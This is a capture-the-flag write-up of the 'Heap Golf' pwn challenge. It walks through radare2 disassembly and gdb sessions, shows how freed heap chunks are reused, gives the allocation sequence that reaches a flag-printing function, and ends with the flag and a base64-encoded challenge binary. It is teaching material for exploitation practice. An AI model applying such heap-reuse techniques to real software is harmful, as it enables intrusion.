# Heap Golf - Pwn

### [~$ cd ..](../)

>Analog golf? That's so 21st century... How about a round of DigiGolf? It's heaps of fun, and security is tight! Just throw your credit cube this way and we can get started...
>
>nc chal1.swampctf.com 1066
>
>-= Challenge by talos878 =-

The binary we are given was not a classical "babyheap" challenge and was quite easy. No need here to get a remote shell, the routine `win_func` `cat`s the flag for us:

```
[0x00400600]> afl
0x00400540    3 26           sym._init
0x00400570    2 16   -> 32   sym.imp.free
0x00400580    2 16   -> 48   sym.imp.write
0x00400590    2 16   -> 48   sym.imp.__stack_chk_fail
0x004005a0    2 16   -> 48   sym.imp.system
0x004005b0    2 16   -> 48   sym.imp.read
0x004005c0    2 16   -> 48   sym.imp.__libc_start_main
0x004005d0    2 16   -> 48   sym.imp.malloc
0x004005e0    2 16   -> 48   sym.imp.atoi
0x004005f0    1 16           sub.__gmon_start___248_5f0
0x00400600    1 41           entry0
0x00400630    4 50   -> 41   sym.deregister_tm_clones
0x00400670    3 53           sym.register_tm_clones
0x004006b0    3 28           sym.__do_global_dtors_aux
0x004006d0    4 38   -> 35   sym.frame_dummy
0x004006f6    1 17           sym.win_func
0x00400707   15 471          sym.main
0x004008e0    4 101          sym.__libc_csu_init
0x00400950    1 2            sym.__libc_csu_fini
0x00400954    1 9            sym._fini
[0x00400600]> sf sym.win_func
[0x004006f6]> pdf
/ (fcn) sym.win_func 17
|   sym.win_func ();
|           ; CALL XREF from 0x004008b8 (sym.main)
|           0x004006f6      55             push rbp
|           0x004006f7      4889e5         mov rbp, rsp
|           0x004006fa      bf68094000     mov edi, str.cat_flag.txt   ; "cat flag.txt" @ 0x400968
|           0x004006ff      e89cfeffff     call sym.imp.system        ; int system(const char *string);
|           0x00400704      90             nop
|           0x00400705      5d             pop rbp
\           0x00400706      c3             ret
```

The `main` routine is as follows:

```
[0x004006f6]> sf sym.main
[0x00400707]> agf
[0x00400707]> VV @ sym.main (nodes 15 edges 19 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                                                                   .----------------------------------------------------------------------------.
                                                                                                   |  0x400707 ;[c]                                                             |
                                                                                                   |   ;-- main:                                                                |
                                                                                                   | (fcn) sym.main 471                                                         |
                                                                                                   |   sym.main ();                                                             |
                                                                                                   | ; var int local_1bch @ rbp-0x1bc                                           |
                                                                                                   | ; var int local_1b8h @ rbp-0x1b8                                           |
                                                                                                   | ; var int local_1b4h @ rbp-0x1b4                                           |
                                                                                                   | ; var int local_1b0h @ rbp-0x1b0                                           |
                                                                                                   | ; var int local_1a8h @ rbp-0x1a8                                           |
                                                                                                   | ; var int local_1a0h @ rbp-0x1a0                                           |
                                                                                                   | ; var int local_10h @ rbp-0x10                                             |
                                                                                                   | ; var int local_8h @ rbp-0x8                                               |
                                                                                                   | ; DATA XREF from 0x0040061d (entry0)                                       |
                                                                                                   | push rbp                                                                   |
                                                                                                   | mov rbp, rsp                                                               |
                                                                                                   | sub rsp, 0x1c0                                                             |
                                                                                                   | mov rax, qword fs:[0x28]                                                   |
                                                                                                   |  ; [0x28:8]=0x1b40 ; '('                                                   |
                                                                                                   | mov qword [rbp - local_8h], rax                                            |
                                                                                                   | xor eax, eax                                                               |
                                                                                                   | mov dword [rbp - local_1bch], 0                                            |
                                                                                                   | mov edi, 0x20 ; "@" 0x00000020                                             |
                                                                                                   | call sym.imp.malloc ;[a];  void *malloc(size_t size);                      |
                                                                                                   | mov qword [rbp - local_1b0h], rax                                          |
                                                                                                   | mov edx, 0x1a                                                              |
                                                                                                   | mov esi, str.target_green_provisioned._n                                   |
                                                                                                   |   `-  ; "target green provisioned.." @ 0x400975                            |
                                                                                                   | mov edi, 0                                                                 |
                                                                                                   | call sym.imp.write ;[b]; ssize_t write(int fd, void *ptr, size_t nbytes);  |
                                                                                                   | mov eax, dword [rbp - local_1bch]                                          |
                                                                                                   | cdqe                                                                       |
                                                                                                   | mov rdx, qword [rbp - local_1b0h]                                          |
                                                                                                   | mov qword [rbp + rax*8 - 0x1a0], rdx                                       |
                                                                                                   | add dword [rbp - local_1bch], 1                                            |
                                                                                                   | mov edx, 0x30 ; '0'                                                        |
                                                                                                   | mov esi, str.enter__1_to_exit_simulation___2_to_free_course._n             |
                                                                                                   |   `-  ; "enter -1 to exit simulation, -2 to free course.." @ 0x400990      |
                                                                                                   | mov edi, 0                                                                 |
                                                                                                   | call sym.imp.write ;[b]; ssize_t write(int fd, void *ptr, size_t nbytes);  |
                                                                                                   `----------------------------------------------------------------------------'
                                                                                                       v
                                                                                                       |
                                                                                                       |
                                                                                                       .---------------------------------------------------------------------------------------------.
                                                                                                   .-----------------------------------------------------------------------------.                  ||
                                                                                                   |  0x400782 ;[g]                                                              |                  ||
                                                                                                   |   ; JMP XREF from 0x004008bd (sym.main)                                     |                  ||
                                                                                                   |   ; JMP XREF from 0x004008ad (sym.main)                                     |                  ||
                                                                                                   | mov edx, 0x1c                                                               |                  ||
                                                                                                   | mov esi, str.Size_of_green_to_provision:                                    |                  ||
                                                                                                   |   `-  ; "Size of green to provision: " @ 0x4009c1                           |                  ||
                                                                                                   | mov edi, 0                                                                  |                  ||
                                                                                                   | call sym.imp.write ;[b]; ssize_t write(int fd, void *ptr, size_t nbytes);   |                  ||
                                                                                                   | lea rax, qword [rbp - local_10h]                                            |                  ||
                                                                                                   | mov edx, 4                                                                  |                  ||
                                                                                                   | mov rsi, rax                                                                |                  ||
                                                                                                   | mov edi, 1                                                                  |                  ||
                                                                                                   | call sym.imp.read ;[d]; ssize_t read(int fildes, void *buf, size_t nbyte);  |                  ||
                                                                                                   | lea rax, qword [rbp - local_10h]                                            |                  ||
                                                                                                   | mov rdi, rax                                                                |                  ||
                                                                                                   | call sym.imp.atoi ;[e]; int atoi(const char *str);                          |                  ||
                                                                                                   | mov dword [rbp - local_1b4h], eax                                           |                  ||
                                                                                                   | cmp dword [rbp - local_1b4h], -1                                            |                  ||
                                                                                                   | je 0x4008c2 ;[f]                                                            |                  ||
                                                                                                   `-----------------------------------------------------------------------------'                  ||
                                                                                                           f t                                                                                      ||
                                                                                                  .--------' '--------------------------------------------.                                         ||
                                                                                                  |                                                       |                                         ||
                                                                                                  |                                                       |                                         ||
                                                                                          .----------------------------------.                      .-----------------------------------------.     ||
                                                                                          |  0x4007cb ;[i]                   |                      |  0x4008c2 ;[f]                          |     ||
                                                                                          | cmp dword [rbp - local_1b4h], -2 |                      |   ; JMP XREF from 0x004007c5 (sym.main) |     ||
                                                                                          | jne 0x40083e ;[h]                |                      | nop                                     |     ||
                                                                                          `----------------------------------'                      `-----------------------------------------'     ||
                                                                                                  f t                                                   v                                           ||
                                                          .---------------------------------------' '-------------------------.                         '-------------------------------.           ||
                                                          |                                                                   |                                                         |           ||
                                                          |                                                                   |                                                         |           ||
                                                  .---------------------------------.                                   .--------------------------------------------------------.      |           ||
                                                  |  0x4007d4 ;[k]                  |                                   |  0x40083e ;[h]                                         |      |           ||
                                                  | mov dword [rbp - local_1b8h], 0 |                                   |   ; JMP XREF from 0x004007d2 (sym.main)                |      |           ||
                                                  | jmp 0x4007ff ;[j]               |                                   | mov eax, dword [rbp - local_1b4h]                      |      |           ||
                                                  `---------------------------------'                                   | cdqe                                                   |      |           ||
                                                      v                                                                 | mov rdi, rax                                           |      |           ||
                                                      |                                                                 | call sym.imp.malloc ;[a];  void *malloc(size_t size);  |      |           ||
                                                      |                                                                 | mov qword [rbp - local_1a8h], rax                      |      |           ||
                                                      |                                                                 | mov rax, qword [rbp - local_1a8h]                      |      |           ||
                                                      |                                                                 | mov edx, dword [rbp - local_1bch]                      |      |           ||
                                                      |                                                                 | mov dword [rax], edx                                   |      |           ||
                                                      |                                                                 | mov eax, dword [rbp - local_1bch]                      |      |           ||
                                                      |                                                                 | cdqe                                                   |      |           ||
                                                      |                                                                 | mov rdx, qword [rbp - local_1a8h]                      |      |           ||
                                                  .---'                                                                 | mov qword [rbp + rax*8 - 0x1a0], rdx                   |      |           ||
                                                  |                                                                     | add dword [rbp - local_1bch], 1                        |      |           ||
                                                  |                                                                     | cmp dword [rbp - local_1bch], 0x30                     |      |           ||
                                                  |                                                                     |   `-  ; [0x30:4]=0 ; '0'                               |      |           ||
                                                  |                                                                     | jne 0x4008a1 ;[n]                                      |      |           ||
                                                  |                                                                     `--------------------------------------------------------'      |           ||
                                                  |                                                                             f t                                                     |           ||
                                                  |                                                   .-------------------------' '-----------------------------------------------------|-----.     ||
                                                  |                                                   |                                                                                 |     |     ||
.-------------------------------------------------.                                                   |                                                                                 |     |     ||
|                                             .-----------------------------------------.     .----------------------------------------------------------------------------.            |     |     ||
|                                             |  0x4007ff ;[j]                          |     |  0x40088b ;[q]                                                             |            |     |     ||
|                                             |   ; JMP XREF from 0x004007de (sym.main) |     | mov edx, 0x19                                                              |            |     |     ||
|                                             | mov eax, dword [rbp - local_1b8h]       |     | mov esi, str.You_re_too_far_under_par.                                     |            |     |     ||
|                                             | cmp eax, dword [rbp - local_1bch]       |     |   `-  ; "You're too far under par." @ 0x4009de                             |            |     |     ||
|                                             | jl 0x4007e0 ;[m]                        |     | mov edi, 0                                                                 |            |     |     ||
|                                             `-----------------------------------------'     | call sym.imp.write ;[b]; ssize_t write(int fd, void *ptr, size_t nbytes);  |            |     |     ||
|                                                   t f                                       | jmp 0x4008c3 ;[p]                                                          |            |     |     ||
|                                                   | |                                       `----------------------------------------------------------------------------'            |     |     ||
|       .-------------------------------------------' '-------------------------------------------v---------------.                                                                     |     |     ||
|       |                                                     .-------------------------------------------------------------------------------------------------------------------------'     |     ||
|       |                                                     |                                                   |                                                                           |     ||
|       |                                                     |                                                   |                                                                           |     ||
| .------------------------------------------------.      .-----------------------------------------.     .----------------------------------------------------------------------------.      |     ||
| |  0x4007e0 ;[m]                                 |      |  0x4008c3 ;[p]                          |     |  0x40080d ;[o]                                                             |      |     ||
| |   ; JMP XREF from 0x0040080b (sym.main)        |      |   ; JMP XREF from 0x0040089f (sym.main) |     | mov edi, 0x20 ; "@" 0x00000020                                             |      |     ||
| | mov eax, dword [rbp - local_1b8h]              |      | mov eax, 0                              |     | call sym.imp.malloc ;[a];  void *malloc(size_t size);                      |      |     ||
| | cdqe                                           |      | mov rcx, qword [rbp - local_8h]         |     | mov qword [rbp - local_1a0h], rax                                          |      |     ||
| | mov rax, qword [rbp + rax*8 - 0x1a0]           |      | xor rcx, qword fs:[0x28]                |     | mov edx, 0x1a                                                              |      |     ||
| | mov rdi, rax                                   |      | je 0x4008dc ;[t]                        |     | mov esi, str.target_green_provisioned._n                                   |      |     ||
| | call sym.imp.free ;[l]; void free(void *ptr);  |      `-----------------------------------------'     |   `-  ; "target green provisioned.." @ 0x400975                            |      |     ||
| | add dword [rbp - local_1b8h], 1                |              f t                                     | mov edi, 0                                                                 |      |     ||
| `------------------------------------------------'              | |                                     | call sym.imp.write ;[b]; ssize_t write(int fd, void *ptr, size_t nbytes);  |      |     ||
`-----'                                                           | |                                     | mov dword [rbp - local_1bch], 1                                            |      |     ||
                                                                  | |                                     | jmp 0x4008a1 ;[n]                                                          |      |     ||
                                                         .--------' '------------------------------------.`----------------------------------------------------------------------------'      |     ||
                                                         |                                               |    v                                                                               |     ||
                                                         |                                               |    '----------------------------------------.     .--------------------------------'     ||
                                                         |                                               |                                             |     |                                      ||
                                                         |                                               |                                             |     |                                      ||
                                                 .------------------------------------------.      .-----------------------------------------.     .------------------------------------------.     ||
                                                 |  0x4008d7 ;[v]                           |      |  0x4008dc ;[t]                          |     |  0x4008a1 ;[n]                           |     ||
                                                 | call sym.imp.__stack_chk_fail ;[u]void); |      |   ; JMP XREF from 0x004008d5 (sym.main) |     |   ; JMP XREF from 0x0040083c (sym.main)  |     ||
                                                 `------------------------------------------'      | leave                                   |     |   ; JMP XREF from 0x00400889 (sym.main)  |     ||
                                                                                                   | ret                                     |     | mov rax, qword [rbp - local_1b0h]        |     ||
                                                                                                   `-----------------------------------------'     | mov eax, dword [rax]                     |     ||
                                                                                                                                                   | cmp eax, 4                               |     ||
                                                                                                                                                   | jne 0x400782 ;[g]                        |     ||
                                                                                                                                                   `------------------------------------------'     ||
                                                                                                                                                           f `--------------------------------------'|
                                                                                                                                                           '--------.                                |
                                                                                                                                                                    |                                |
                                                                                                                                                                    |                                |
                                                                                                                                                            .-------------------------.              |
                                                                                                                                                            |  0x4008b3 ;[s]          |              |
                                                                                                                                                            | mov eax, 0              |              |
                                                                                                                                                            | call sym.win_func ;[r]  |              |
                                                                                                                                                            | jmp 0x400782 ;[g]       |              |
                                                                                                                                                            `-------------------------'              |
                                                                                                                                                                `------------------------------------'

```

As the routine starts, a 32-bytes chunk is allocated (`0x00400730`) and the address of this chunk is stored at `$rbp-0x1b0`. Another important variable is located at `$rbp-0x1bc`, set to 0 at the beginning. It's actually a counter, whose value is incremented for each newly allocated chunk and written into it (it's then equal to 1 for the first chunk allocated by us). The program then displays:

>target green provisioned  
>enter -1 to exit simulation, -2 to free a course  
>Size of green to provision:

We then have 3 choices:
* -1: exits immediately
* -2: frees all allocated chunks in the heap (reallocates the first chunk and resets the counter to 1)
* another number `n`: allocates an n-bytes chunk in the heap, and writes the value of the counter into this new chunk

After each allocation, 2 tests are performed:
* if the counter reaches the value 0x30, the program then exits
* if the value written in the initial chunk is 4, then `win_func` is called

Let's summarize what happens and what we are supposed to do:

* First, a 32-bytes chunk is allocated in the heap. It's full of null bytes and a counter is set to 1
* we can choose to allocate new chunks or to free the heap
* if we choose to free chunks, they are all freed. The original 32-bytes chunk is automatically reallocated and the counter is reset to 1
* The goal is to write "4" in the very first chunk (that we are not supposed to control)

Let's run the program, break at `0x40080d` to see what happens when we allocate and free a chunk immediately:

```
gdb-peda$ run
Starting program: ~/heap_golf1
target green provisioned.
enter -1 to exit simulation, -2 to free course.
Size of green to provision: 32
Size of green to provision: -2

[----------------------------------registers-----------------------------------]
RAX: 0x2
RBX: 0x0
RCX: 0x602000 --> 0x0
RDX: 0xffffffff
RSI: 0x0
RDI: 0x7ffff7dd3b10 --> 0x602030 --> 0x0
RBP: 0x7fffffffe1c0 --> 0x4008e0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe000 --> 0x200000000
RIP: 0x40080d (<main+262>:	mov    edi,0x20)
R8 : 0x602040 --> 0x602000 --> 0x0
R9 : 0x0
R10: 0x8ba
R11: 0x7ffff7ab5510 (<__GI___libc_free>:	mov    rax,QWORD PTR [rip+0x31d9e1]        # 0x7ffff7dd2ef8)
R12: 0x400600 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe2a0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4007ff <main+248>:	mov    eax,DWORD PTR [rbp-0x1b8]
   0x400805 <main+254>:	cmp    eax,DWORD PTR [rbp-0x1bc]
   0x40080b <main+260>:	jl     0x4007e0 <main+217>
=> 0x40080d <main+262>:	mov    edi,0x20
   0x400812 <main+267>:	call   0x4005d0 <malloc@plt>
   0x400817 <main+272>:	mov    QWORD PTR [rbp-0x1a0],rax
   0x40081e <main+279>:	mov    edx,0x1a
   0x400823 <main+284>:	mov    esi,0x400975
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe000 --> 0x200000000
0008| 0x7fffffffe008 --> 0xfffffffe00000002
0016| 0x7fffffffe010 --> 0x602010 --> 0x0
0024| 0x7fffffffe018 --> 0x602040 --> 0x602000 --> 0x0
0032| 0x7fffffffe020 --> 0x602010 --> 0x0
0040| 0x7fffffffe028 --> 0x602040 --> 0x602000 --> 0x0
0048| 0x7fffffffe030 --> 0x0
0056| 0x7fffffffe038 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040080d in main ()
gdb-peda$ x/x $rbp-0x1a0
0x7fffffffe020:	0x0000000000602010
gdb-peda$ x/20gx 0x0000000000602010
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000031
0x602040:	0x0000000000602000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000020fa1
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000000
0x6020a0:	0x0000000000000000	0x0000000000000000
```

_NOTE: the address at `$rbp-0x1a0` is the same as the one in `$rbp-0x1b0`, it's the address of the first chunk_

We can see that if we allocate a 32-bytes chunk (same size as the first one) and free it, a pointer to the first chunk is put in the freed chunk. If we execute step by step the next instructions, we can see that the pointer returned by `malloc` is the second chunk:

```
[-------------------------------------code-------------------------------------]
   0x40080b <main+260>:	jl     0x4007e0 <main+217>
   0x40080d <main+262>:	mov    edi,0x20
   0x400812 <main+267>:	call   0x4005d0 <malloc@plt>
=> 0x400817 <main+272>:	mov    QWORD PTR [rbp-0x1a0],rax
   0x40081e <main+279>:	mov    edx,0x1a
   0x400823 <main+284>:	mov    esi,0x400975
   0x400828 <main+289>:	mov    edi,0x0
   0x40082d <main+294>:	call   0x400580 <write@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe000 --> 0x200000000
0008| 0x7fffffffe008 --> 0xfffffffe00000002
0016| 0x7fffffffe010 --> 0x602010 --> 0x0
0024| 0x7fffffffe018 --> 0x602040 --> 0x602000 --> 0x0
0032| 0x7fffffffe020 --> 0x602010 --> 0x0
0040| 0x7fffffffe028 --> 0x602040 --> 0x602000 --> 0x0
0048| 0x7fffffffe030 --> 0x0
0056| 0x7fffffffe038 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000400817 in main ()
gdb-peda$ x/20gx 0x0000000000602010
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000031
0x602040:	0x0000000000602000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000020fa1
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000000
0x6020a0:	0x0000000000000000	0x0000000000000000
gdb-peda$ i reg eax
eax            0x602040	0x602040
```

As a reminder, the goal is to write a "4" in the first chunk (the one at `0x602010`), and we are almost done since we have a pointer to this address. If we allocate 3 bigger useless chunks, and reallocate a 32-bytes one, it will be placed at the expected address because its size fits the available space of the first chunk:

```
gdb-peda$ continue
Continuing.
target green provisioned.
Size of green to provision: 256
Size of green to provision: 256
Size of green to provision: 256
Size of green to provision: 32
[New process 5820]
process 5820 is executing new program: /bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x40080d
```

Let's do it remotely:

![flag](flag.png)

FLAG: **flag{Gr34t_J0b_t0ur1ng_0ur_d1gi7al_L1nk5}**

Challenge:
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
Rvz//xEAAAAAQQ4QhgJDDQZMDAcIAAAAHAAAAGQAAAA3/P//1wEAAABBDhCGAkMNBgPSAQwHCABE
AAAAhAAAAPD9//9lAAAAAEIOEI8CQg4YjgNFDiCNBEIOKIwFSA4whgZIDjiDB00OQHIOOEEOMEEO
KEIOIEIOGEIOEEIOCAAUAAAAzAAAABj+//8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAA0AZAAAAAAACwBkAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAwAAAAAAAAA
QAVAAAAAAAANAAAAAAAAAFQJQAAAAAAAGQAAAAAAAAAQDmAAAAAAABsAAAAAAAAACAAAAAAAAAAa
AAAAAAAAABgOYAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+/28AAAAAmAJAAAAAAAAFAAAAAAAAAKgD
QAAAAAAABgAAAAAAAAC4AkAAAAAAAAoAAAAAAAAAdgAAAAAAAAALAAAAAAAAABgAAAAAAAAAFQAA
AAAAAAAAAAAAAAAAAAMAAAAAAAAAABBgAAAAAAACAAAAAAAAAMAAAAAAAAAAFAAAAAAAAAAHAAAA
AAAAABcAAAAAAAAAgARAAAAAAAAHAAAAAAAAAGgEQAAAAAAACAAAAAAAAAAYAAAAAAAAAAkAAAAA
AAAAGAAAAAAAAAD+//9vAAAAADgEQAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAHgRAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgOYAAAAAAA
AAAAAAAAAAAAAAAAAAAAAHYFQAAAAAAAhgVAAAAAAACWBUAAAAAAAKYFQAAAAAAAtgVAAAAAAADG
BUAAAAAAANYFQAAAAAAA5gVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAR0NDOiAoVWJ1bnR1IDUuNC4w
